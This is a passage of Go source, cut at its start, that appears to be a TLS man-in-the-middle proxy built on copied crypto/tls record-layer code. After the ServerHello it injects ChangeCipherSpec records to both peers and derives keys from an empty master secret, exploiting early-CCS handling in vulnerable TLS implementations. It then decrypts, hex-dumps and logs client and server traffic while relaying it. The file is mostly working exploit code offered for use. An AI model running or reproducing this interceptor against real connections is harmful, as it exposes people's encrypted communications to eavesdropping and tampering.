    t := uint(len(payload)-1) - uint(paddingLen)
    // if len(payload) >= (paddingLen - 1) then the MSB of t is zero
    good := byte(int32(^t) >> 31)

    toCheck := 255 // the maximum possible padding length
    // The length of the padded data is public, so we can use an if here
    if toCheck+1 > len(payload) {
        toCheck = len(payload) - 1
    }

    for i := 0; i < toCheck; i++ {
        t := uint(paddingLen) - uint(i)
        // if i <= paddingLen then the MSB of t is zero
        mask := byte(int32(^t) >> 31)
        b := payload[len(payload)-1-i]
        good &^= mask&paddingLen ^ mask&b
    }

    // We AND together the bits of good and replicate the result across
    // all the bits.
    good &= good << 4
    good &= good << 2
    good &= good << 1
    good = uint8(int8(good) >> 7)

    toRemove := good&paddingLen + 1
    return payload[:len(payload)-int(toRemove)], good
}

// removePaddingSSL30 is a replacement for removePadding in the case that the
// protocol version is SSLv3. In this version, the contents of the padding
// are random and cannot be checked.
func removePaddingSSL30(payload []byte) ([]byte, byte) {
    if len(payload) < 1 {
        return payload, 0
    }

    paddingLen := int(payload[len(payload)-1]) + 1
    if paddingLen > len(payload) {
        return payload, 0
    }

    return payload[:len(payload)-paddingLen], 255
}

func roundUp(a, b int) int {
    return a + (b-a%b)%b
}

// cbcMode is an interface for block ciphers using cipher block chaining.
type cbcMode interface {
    cipher.BlockMode
    SetIV([]byte)
}

type alert uint8

const (
    // alert level
    alertLevelWarning = 1
    alertLevelError   = 2
)

const (
    alertCloseNotify            alert = 0
    alertUnexpectedMessage      alert = 10
    alertBadRecordMAC           alert = 20
    alertDecryptionFailed       alert = 21
    alertRecordOverflow         alert = 22
    alertDecompressionFailure   alert = 30
    alertHandshakeFailure       alert = 40
    alertBadCertificate         alert = 42
    alertUnsupportedCertificate alert = 43
    alertCertificateRevoked     alert = 44
    alertCertificateExpired     alert = 45
    alertCertificateUnknown     alert = 46
    alertIllegalParameter       alert = 47
    alertUnknownCA              alert = 48
    alertAccessDenied           alert = 49
    alertDecodeError            alert = 50
    alertDecryptError           alert = 51
    alertProtocolVersion        alert = 70
    alertInsufficientSecurity   alert = 71
    alertInternalError          alert = 80
    alertUserCanceled           alert = 90
    alertNoRenegotiation        alert = 100
)
// decrypt checks and strips the mac and decrypts the data in b. Returns a
// success boolean, the number of bytes to skip from the start of the record in
// order to get the application payload, and an optional alert value.
func (hc *halfConn) decrypt(b *block) (ok bool, prefixLen int, alertValue alert) {
    // pull out payload
    payload := b.data[recordHeaderLen:]

    macSize := 0
    if hc.mac != nil {
        macSize = hc.mac.Size()
    }

    paddingGood := byte(255)
    explicitIVLen := 0

    // decrypt
    if hc.cipher != nil {
        switch c := hc.cipher.(type) {
        case cipher.Stream:
            c.XORKeyStream(payload, payload)
        case cipher.AEAD:
            explicitIVLen = 8
            if len(payload) < explicitIVLen {
                return false, 0, alertBadRecordMAC
            }
            nonce := payload[:8]
            payload = payload[8:]

            var additionalData [13]byte
            copy(additionalData[:], hc.seq[:])
            copy(additionalData[8:], b.data[:3])
            n := len(payload) - c.Overhead()
            additionalData[11] = byte(n >> 8)
            additionalData[12] = byte(n)
            var err error
            payload, err = c.Open(payload[:0], nonce, payload, additionalData[:])
            if err != nil {
                return false, 0, alertBadRecordMAC
            }
            b.resize(recordHeaderLen + explicitIVLen + len(payload))
        case cbcMode:
            blockSize := c.BlockSize()
            if hc.version >= VersionTLS11 {
                explicitIVLen = blockSize
            }

            if len(payload)%blockSize != 0 || len(payload) < roundUp(explicitIVLen+macSize+1, blockSize) {
                return false, 0, alertBadRecordMAC
            }

            if explicitIVLen > 0 {
                c.SetIV(payload[:explicitIVLen])
                payload = payload[explicitIVLen:]
            }
            c.CryptBlocks(payload, payload)
            if hc.version == VersionSSL30 {
                payload, paddingGood = removePaddingSSL30(payload)
            } else {
                payload, paddingGood = removePadding(payload)
            }
            b.resize(recordHeaderLen + explicitIVLen + len(payload))

            // note that we still have a timing side-channel in the
            // MAC check, below. An attacker can align the record
            // so that a correct padding will cause one less hash
            // block to be calculated. Then they can iteratively
            // decrypt a record by breaking each byte. See
            // "Password Interception in a SSL/TLS Channel", Brice
            // Canvel et al.
            //
            // However, our behavior matches OpenSSL, so we leak
            // only as much as they do.
        default:
            panic("unknown cipher type")
        }
    }

    // check, strip mac
    if hc.mac != nil {
        if len(payload) < macSize {
            return false, 0, alertBadRecordMAC
        }

        // strip mac off payload, b.data
        n := len(payload) - macSize
        b.data[3] = byte(n >> 8)
        b.data[4] = byte(n)
        b.resize(recordHeaderLen + explicitIVLen + n)
        remoteMAC := payload[n:]
        localMAC := hc.mac.MAC(hc.inDigestBuf, hc.seq[0:], b.data[:recordHeaderLen], payload[:n])

        if subtle.ConstantTimeCompare(localMAC, remoteMAC) != 1 || paddingGood != 255 {
            return false, 0, alertBadRecordMAC
        }
        hc.inDigestBuf = localMAC
    }
    hc.incSeq()

    return true, recordHeaderLen + explicitIVLen, 0
}

// padToBlockSize calculates the needed padding block, if any, for a payload.
// On exit, prefix aliases payload and extends to the end of the last full
// block of payload. finalBlock is a fresh slice which contains the contents of
// any suffix of payload as well as the needed padding to make finalBlock a
// full block.
func padToBlockSize(payload []byte, blockSize int) (prefix, finalBlock []byte) {
    overrun := len(payload) % blockSize
    paddingLen := blockSize - overrun
    prefix = payload[:len(payload)-overrun]
    finalBlock = make([]byte, blockSize)
    copy(finalBlock, payload[len(payload)-overrun:])
    for i := overrun; i < blockSize; i++ {
        finalBlock[i] = byte(paddingLen - 1)
    }
    return
}

// encrypt encrypts and macs the data in b.
func (hc *halfConn) encrypt(b *block, explicitIVLen int) (bool, alert) {
    // mac
    if hc.mac != nil {
        mac := hc.mac.MAC(hc.outDigestBuf, hc.seq[0:], b.data[:recordHeaderLen], b.data[recordHeaderLen+explicitIVLen:])
        
        n := len(b.data)
        b.resize(n + len(mac))
        copy(b.data[n:], mac)
        hc.outDigestBuf = mac
    }

    payload := b.data[recordHeaderLen:]
    // encrypt
    if hc.cipher != nil {
        switch c := hc.cipher.(type) {
        case cipher.Stream:
            c.XORKeyStream(payload, payload)
        case cipher.AEAD:
            payloadLen := len(b.data) - recordHeaderLen - explicitIVLen
            b.resize(len(b.data) + c.Overhead())
            nonce := b.data[recordHeaderLen : recordHeaderLen+explicitIVLen]
            payload := b.data[recordHeaderLen+explicitIVLen:]
            payload = payload[:payloadLen]

            var additionalData [13]byte
            copy(additionalData[:], hc.seq[:])
            copy(additionalData[8:], b.data[:3])
            additionalData[11] = byte(payloadLen >> 8)
            additionalData[12] = byte(payloadLen)

            c.Seal(payload[:0], nonce, payload, additionalData[:])
        case cbcMode:
            blockSize := c.BlockSize()
            if explicitIVLen > 0 {
                c.SetIV(payload[:explicitIVLen])
                payload = payload[explicitIVLen:]
            }
            prefix, finalBlock := padToBlockSize(payload, blockSize)
            b.resize(recordHeaderLen + explicitIVLen + len(prefix) + len(finalBlock))
            c.CryptBlocks(b.data[recordHeaderLen+explicitIVLen:], prefix)
            c.CryptBlocks(b.data[recordHeaderLen+explicitIVLen+len(prefix):], finalBlock)
            
        default:
            panic("unknown cipher type")
        }
    }

    // update length to include MAC and any block padding needed.
    n := len(b.data) - recordHeaderLen
    b.data[3] = byte(n >> 8)
    b.data[4] = byte(n)
    
    hc.incSeq()

    return true, 0
}

// A block is a simple data buffer.
type block struct {
    data []byte
    off  int // index for Read
    link *block
}

// resize resizes block to be n bytes, growing if necessary.
func (b *block) resize(n int) {
    if n > cap(b.data) {
        b.reserve(n)
    }
    b.data = b.data[0:n]
}

// reserve makes sure that block contains a capacity of at least n bytes.
func (b *block) reserve(n int) {
    if cap(b.data) >= n {
        return
    }
    m := cap(b.data)
    if m == 0 {
        m = 1024
    }
    for m < n {
        m *= 2
    }
    data := make([]byte, len(b.data), m)
    copy(data, b.data)
    b.data = data
}

// readFromUntil reads from r into b until b contains at least n bytes
// or else returns an error.
func (b *block) readFromUntil(r io.Reader, n int) error {
    // quick case
    if len(b.data) >= n {
        return nil
    }

    // read until have enough.
    b.reserve(n)
    for {
        m, err := r.Read(b.data[len(b.data):cap(b.data)])
        b.data = b.data[0 : len(b.data)+m]
        if len(b.data) >= n {
            // TODO(bradfitz,agl): slightly suspicious
            // that we're throwing away r.Read's err here.
            break
        }
        if err != nil {
            return err
        }
    }
    return nil
}

func (b *block) Read(p []byte) (n int, err error) {
    n = copy(p, b.data[b.off:])
    b.off += n
    return
}

// newBlock allocates a new block, from hc's free list if possible.
func (hc *halfConn) newBlock() *block {
    b := hc.bfree
    if b == nil {
        return new(block)
    }
    hc.bfree = b.link
    b.link = nil
    b.resize(0)
    return b
}

// freeBlock returns a block to hc's free list.
// The protocol is such that each side only has a block or two on
// its free list at a time, so there's no need to worry about
// trimming the list, etc.
func (hc *halfConn) freeBlock(b *block) {
    b.link = hc.bfree
    hc.bfree = b
}

// splitBlock splits a block after the first n bytes,
// returning a block with those n bytes and a
// block with the remainder.  the latter may be nil.
func (hc *halfConn) splitBlock(b *block, n int) (*block, *block) {
    if len(b.data) <= n {
        return b, nil
    }
    bb := hc.newBlock()
    bb.resize(len(b.data) - n)
    copy(bb.data, b.data[n:])
    b.data = b.data[0:n]
    return b, bb
}

// writeRecord writes a TLS record with the given type and payload
// to the connection and updates the record layer state.
// c.out.Mutex <= L.
func (hs *halfConn) writeRecord(to net.Conn, data1 []byte) (n int, err error) {
    b  := hs.newBlock()
    data := make( []byte, len(data1)-5)
    copy( data, data1[5:] )
    for len(data) > 0 {
        m := len(data)
        if m > maxPlaintext {
            m = maxPlaintext
        }
        explicitIVLen := 0
        explicitIVIsSeq := false

        var cbc cbcMode
        if hs.version >= VersionTLS11 {
            var ok bool
            if cbc, ok = hs.cipher.(cbcMode); ok {
                explicitIVLen = cbc.BlockSize()
            }
        }
        if explicitIVLen == 0 {
            if _, ok := hs.cipher.(cipher.AEAD); ok {
                explicitIVLen = 8
                // The AES-GCM construction in TLS has an
                // explicit nonce so that the nonce can be
                // random. However, the nonce is only 8 bytes
                // which is too small for a secure, random
                // nonce. Therefore we use the sequence number
                // as the nonce.
                explicitIVIsSeq = true
            }
        }
        b.resize(recordHeaderLen + explicitIVLen + m)
        b.data[0] = data1[0]
        vers := hs.version
        if vers == 0 {
            // Some TLS servers fail if the record version is
            // greater than TLS 1.0 for the initial ClientHello.
            vers = VersionTLS10
        }
        b.data[1] = byte(vers >> 8)
        b.data[2] = byte(vers)
        b.data[3] = data1[3]
        b.data[4] = data1[4]
        
        if explicitIVLen > 0 {
            explicitIV := b.data[recordHeaderLen : recordHeaderLen+explicitIVLen]
            if explicitIVIsSeq {
                copy(explicitIV, hs.seq[:])
            } else {
                if _, err = io.ReadFull( rand.Reader, explicitIV ); err != nil {
                    break
                }
            }
        }
        copy(b.data[recordHeaderLen+explicitIVLen:], data)
        
        hs.encrypt(b, explicitIVLen)
        
        _, err = to.Write(b.data)
        if err != nil {
            break
        }
        n += m
        data = data[m:]
    }
    
    hs.freeBlock(b)
    return
}

/**********************************************************************************/
  
type Channel struct {  
    from, to              net.Conn  
    logger, binary_logger chan []byte  
    ack                   chan bool  
    flag                  int  
}  
  


var (  
    host        *string = flag.String("host", "", "target host or address")  
    port        *string = flag.String("port", "0", "target port")  
    listen_port *string = flag.String("listen_port", "0", "listen port")  
)  


type ConnInfo struct
{
    sync.Mutex
    srandom             []byte
    crandom             []byte
    ckey                []byte
    skey                []byte
    mhello               *clientHelloMsg
    nhello               *serverHelloMsg
    clientMAC            []byte
    serverMAC            []byte
    clientKey            []byte
    serverKey            []byte
    clientIV             []byte
    serverIV             []byte
    cpacket_n            uint32
    spacket_n            uint32
    cencrypt             uint32
    sencrypt             uint32
    mitmcenrypted        uint32
    mitmsenrypted        uint32
    c_ccs                uint32
    s_ccs                uint32
    suite               *cipherSuite
    c_hc, s_hc          *halfConn
    mitmc_hc, mitms_hc  *halfConn
}


func (ci *ConnInfo) establishKeys() error {
    
    
    ci.clientMAC, ci.serverMAC, ci.clientKey, ci.serverKey, ci.clientIV, ci.serverIV =
        keysFromMasterSecret(ci.nhello.vers, []byte{}, ci.mhello.random, ci.nhello.random, ci.suite.macLen, ci.suite.keyLen, ci.suite.ivLen)
    
    var clientCipher, serverCipher interface{}
    var clientHash, serverHash macFunction
    var mclientCipher, mserverCipher interface{}
    var mclientHash, mserverHash macFunction
    if ci.suite.cipher != nil {
        clientCipher  = ci.suite.cipher( ci.clientKey, ci.clientIV, false /* not for reading */)
        clientHash    = ci.suite.mac(ci.nhello.vers, ci.clientMAC)
        serverCipher  = ci.suite.cipher( ci.serverKey, ci.serverIV, true /* for reading */)
        serverHash    = ci.suite.mac(ci.nhello.vers, ci.serverMAC)
        
        mclientCipher = ci.suite.cipher( ci.clientKey, ci.clientIV, false /* not for reading */)
        mclientHash   = ci.suite.mac(ci.nhello.vers, ci.clientMAC)
        mserverCipher = ci.suite.cipher( ci.serverKey, ci.serverIV, true /* for reading */)
        mserverHash   = ci.suite.mac(ci.nhello.vers, ci.serverMAC)
    } else {
        clientCipher  = ci.suite.aead( ci.clientKey, ci.clientIV)
        serverCipher  = ci.suite.aead( ci.serverKey, ci.serverIV)
        mclientCipher = ci.suite.aead( ci.clientKey, ci.clientIV)
        mserverCipher = ci.suite.aead( ci.serverKey, ci.serverIV)
    }
    
    ci.s_hc.prepareCipherSpec(ci.nhello.vers, serverCipher,  serverHash  )
    ci.c_hc.prepareCipherSpec(ci.nhello.vers, clientCipher,  clientHash  )
    ci.mitms_hc.prepareCipherSpec(ci.nhello.vers, mserverCipher, mserverHash )
    ci.mitmc_hc.prepareCipherSpec(ci.nhello.vers,    mclientCipher, mclientHash )
    return nil
}

func (ci *ConnInfo) ms_establishKeys() error {
    var  mserverCipher interface{}
    var  mserverHash macFunction
    
    if ci.suite.cipher != nil {
        mserverCipher = ci.suite.cipher( ci.serverKey, ci.serverIV, true /* for reading */)
        mserverHash = ci.suite.mac(ci.nhello.vers, ci.serverMAC)
    } else {
        mserverCipher = ci.suite.aead( ci.serverKey, ci.serverIV)
    }

    ci.mitms_hc.prepareCipherSpec(ci.nhello.vers, mserverCipher, mserverHash)
    return nil
}



func ( ci *ConnInfo )mycencrypt( b []byte, n int, c *Channel ) bool {
    var i uint32
    var lenOfPacket uint32
    
    if n <= 0 {
        return false
    }

    for n > 0 {
            lenOfPacket = ((uint32(b[i+3])<<8) | uint32(b[i+4])) + 5
            buf := make( []byte, lenOfPacket )
            copy( buf, b[i:i+lenOfPacket ] )
            
            if ci.cpacket_n == 0 {
                if buf[0] == 0x16 && buf[1] == 0x03 && buf[5] == 0x01 {
                    ci.mhello.unmarshal( buf[5:] )
                } else {
                    fmt.Printf( "[!] Error, Not client hello!" )
                    return false
                }
            }

            if ci.cencrypt == 0 && lenOfPacket == 0x06 && buf[0] == 0x14 && buf[1] == 0x03 && buf[5] == 0x01 {
                ci.cencrypt = 1
                ci.c_hc.changeCipherSpec()
                n = n - int(lenOfPacket)
                i = lenOfPacket + i
                ci.cpacket_n += 1
                continue
            }  
            
            if ci.mitmcenrypted == 0 {
                c.to.Write( buf[:lenOfPacket] )
                n = n - int(lenOfPacket)
                i = lenOfPacket + i
                ci.cpacket_n += 1
                ci.Lock()
                continue
            }
            
            
                    
        if ci.cencrypt != 0 {
                if n > 20 {
                    b_block := ci.s_hc.newBlock()
                    b_block.resize( len(buf) )
                    copy( b_block.data, buf )
                    ci.c_hc.decrypt( b_block )
                    buf = make( []byte, len( b_block.data ) )
                    copy( buf, b_block.data )
                    ci.c_hc.freeBlock( b_block )
                } else {
                    fmt.Printf( "[!] Failed to decrypt data!\n" )
                    return false
                }
            } 
        
            fmt.Printf( "client->server: \n%v\n", hex.Dump( buf ) )
            ci.mitmc_hc.writeRecord( c.to, buf )
            
            n             = n - int(lenOfPacket)
            i             = lenOfPacket + i
            ci.cpacket_n += 1
        }
        
    return true
}


func ( ci *ConnInfo )mysencrypt( b []byte, n int, c *Channel ) bool {
    var i uint32
    var lenOfPacket uint32
    
    if n <= 0 {
        return false
    }
    
    for n > 0 {
        lenOfPacket = ((uint32(b[i+3])<<8) | uint32(b[i+4])) + 5
        buf := make( []byte, lenOfPacket );
        copy( buf, b[i:i+lenOfPacket ] )

        
        if ci.spacket_n == 0 {
            if buf[0] == 0x16 && buf[1] == 0x03 && buf[5] == 0x02 {
                ci.nhello.unmarshal( buf[5:] )
                ci.srandom = ci.nhello.random
                ci.suite = getCipherSuite( ci.nhello.cipherSuite )
                if ci.suite == nil {
                    fmt.Printf( "[!] Unsupport CipherSuite: %4.4x\n", ci.nhello.cipherSuite )
                    return false
                }
                ci.establishKeys();
                css := []byte( "\x14\x03\x03\x00\x01\x01" )
                css[1] = buf[1]
                css[2] = buf[2]
                c.from.Write( css )
                c.to.Write(buf[:lenOfPacket])    
                c.to.Write( css )
                ci.mitmcenrypted = 1
                ci.mitmsenrypted = 1
                ci.mitms_hc.changeCipherSpec()
                ci.mitmc_hc.changeCipherSpec()

                ci.spacket_n += 1
                n = n - int(lenOfPacket)
                i = lenOfPacket + i
                
                ci.Unlock()
                continue
            } else {
                fmt.Printf( "[!] Error, Not server hello!" )
                return false
            }
        }
        
        
        if ci.sencrypt == 0 && lenOfPacket == 0x06 && buf[0] == 0x14 && buf[1] == 0x03 && buf[5] == 0x01 {
                
                ci.s_ccs = 1

        }

        if ci.mitmsenrypted == 0 {
                c.to.Write( buf[:lenOfPacket] )
                n             = n - int(lenOfPacket)
                i             = lenOfPacket + i
                ci.spacket_n += 1
                continue
        }
        
        if ci.sencrypt != 0 {
            if n > 20 {
                b_block := ci.s_hc.newBlock()
                b_block.resize( len(buf) )
                copy( b_block.data, buf )
                ci.s_hc.decrypt( b_block )
                buf = make( []byte, len( b_block.data ) )
                copy( buf, b_block.data )
                ci.s_hc.freeBlock( b_block )
            } else {
                fmt.Printf( "[!] Failed to decrypt data!\n" )
                return false
            }
        } 
        
        fmt.Printf( "server->client: \n%v\n", hex.Dump( buf ) )
        ci.mitms_hc.writeRecord( c.to, buf )
        
        if ci.s_ccs == 1 {
            ci.sencrypt = 1
            ci.s_hc.changeCipherSpec()
            ci.mitms_hc = new( halfConn )
            ci.ms_establishKeys()
            ci.mitms_hc.changeCipherSpec()
            ci.s_ccs = 0
        }
        
        n             = n - int(lenOfPacket)
        i             = lenOfPacket + i
        ci.spacket_n += 1
    }
    
    return true
}

  
func connection_logger(data chan []byte, conn_n int, local_info, remote_info string) {  
    log_name := fmt.Sprintf("log-%s-%04d-%s-%s.log", format_time(time.Now()), conn_n, local_info, remote_info)  
    logger_loop(data, log_name)  
}  
  
func binary_logger(data chan []byte, conn_n int, peer string) {  
    log_name := fmt.Sprintf("log-binary-%s-%04d-%s.log", format_time(time.Now()), conn_n, peer)  
    logger_loop(data, log_name)  
}  
  
func logger_loop(data chan []byte, log_name string) {  
    f, err := os.Create(log_name)  
    if err != nil {  
        die("Unable to create file %s, %v\n", log_name, err)  
    }  
    defer f.Close()  
    for {  
        b := <-data  
        if len(b) == 0 {  
            break  
        }  
        f.Write(b)  
        f.Sync()  
    }  
}  
 
func ( ci *ConnInfo )pass_through(c *Channel) {  
    from_peer   := printable_addr(c.from.LocalAddr())  
    to_peer     := printable_addr(c.to.LocalAddr())  
    successFlag := false
    b           := make([]byte, 10240)  
    offset      := 0  
    packet_n    := 0
    for {  
        n, err := c.from.Read(b)  
        if err != nil {  
            c.logger <- []byte(fmt.Sprintf("Disconnected from %s\n", from_peer))  
            break  
        }  

        if n > 0 {  
            
            c.logger <- []byte(fmt.Sprintf("Received (#%d, %08X) %d bytes from %s\n", packet_n, offset, n, from_peer))  
            c.logger <- []byte(hex.Dump(b[:n]))  
            c.binary_logger <- b[:n]  
                       
            if c.flag == 0 {
                successFlag = ci.mysencrypt( b[:n], n,  c )
            } else {
                successFlag = ci.mycencrypt( b[:n], n, c)
            }
            
            if successFlag == false {
                break
            }

            c.logger <- []byte(fmt.Sprintf("Sent (#%d) to %s\n", packet_n, to_peer))  
            offset   += n  
            packet_n += 1  
            
            b = make([]byte, 10240) 
        }  
    } 
        
    c.from.Close()  
    c.to.Close()  
    c.ack <- true  
}  
  
func process_connection(local net.Conn, conn_n int, target string) {  
    remote, err := net.Dial("tcp", target)  
    if err != nil {  
        fmt.Printf("Unable to connect to %s, %v\n", target, err)  
    }  
  
    local_info  := printable_addr(remote.LocalAddr())  
    remote_info := printable_addr(remote.RemoteAddr())  
    
    ci := &ConnInfo{
        srandom   :            []byte{},
        crandom   :            []byte{},
        ckey      :            []byte{},
        skey      :            []byte{},

        clientMAC :            []byte{},
        serverMAC :            []byte{},
        clientKey :            []byte{},
        serverKey :            []byte{},
        clientIV  :            []byte{},
        serverIV  :            []byte{},
        cpacket_n :            0,
        spacket_n :            0,
        s_hc      :            new( halfConn ),
        c_hc      :            new( halfConn ),
        mitmc_hc  :            new( halfConn ),
        mitms_hc  :            new( halfConn ),
        c_ccs     :            0,
        s_ccs     :            0,
        mhello    :            new( clientHelloMsg ),
        nhello    :            new( serverHelloMsg ),
        cencrypt  :            0,
        sencrypt  :            0,
    }
    
    started     := time.Now()  
    logger      := make(chan []byte)  
    from_logger := make(chan []byte)  
    to_logger   := make(chan []byte)  
    ack         := make(chan bool)  
  
    go connection_logger(logger, conn_n, local_info, remote_info)  
    go binary_logger(from_logger, conn_n, local_info)  
    go binary_logger(to_logger, conn_n, remote_info)  
  
    logger <- []byte(fmt.Sprintf("Connected to %s at %s\n", target, format_time(started)))  
  
    go ci.pass_through(&Channel{remote, local, logger, to_logger, ack, 0 })  
    go ci.pass_through(&Channel{local, remote, logger, from_logger, ack, 1})  
    <-ack // Make sure that the both copiers gracefully finish.  
    <-ack //  
  
    finished := time.Now()  
    duration := finished.Sub(started)  
    logger <- []byte(fmt.Sprintf("Finished at %s, duration %s\n", format_time(started), duration.String()))  
  
    logger <- []byte{}      // Stop logger  
    from_logger <- []byte{} // Stop "from" binary logger  
    to_logger <- []byte{}   // Stop "to" binary logger 
}  
  
func main() {  
    runtime.GOMAXPROCS(runtime.NumCPU())  

    flag.Parse()  
    if flag.NFlag() != 3 {  
        fmt.Printf("usage: gotcpspy -host target_host -port target_port -listen_port=local_port\n")  
        flag.PrintDefaults()  
        os.Exit(1)  
    }  
    target := net.JoinHostPort(*host, *port)  
    fmt.Printf("Start listening on port %s and forwarding data to %s\n", *listen_port, target)  
    ln, err := net.Listen("tcp", ":"+*listen_port)  
    if err != nil {  
        fmt.Printf("Unable to start listener, %v\n", err)  
        os.Exit(1)  
    }  
    conn_n := 1  
    for {  
        if conn, err := ln.Accept(); err == nil {  
            go process_connection(conn, conn_n, target)  
            conn_n += 1  
        } else {  
            fmt.Printf("Accept failed, %v\n", err)  
        }  
    }  
}  





